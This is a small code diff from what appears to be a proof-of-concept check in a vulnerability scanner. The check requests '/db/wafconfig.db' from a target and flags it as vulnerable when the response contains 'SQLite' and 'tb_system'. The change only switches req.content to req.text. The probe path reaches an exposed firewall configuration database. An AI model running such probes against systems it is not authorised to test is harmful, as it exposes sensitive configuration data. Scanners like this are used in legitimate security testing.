@@ -50,7 +50,7 @@ class Poc(ABPoc):
             payload = '/db/wafconfig.db'
             verify_url = self.target + payload
             req = requests.get(verify_url)
-            content = req.content
+            content = req.text
 
             if req.status_code == 200 and 'SQLite' in content and 'tb_system' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
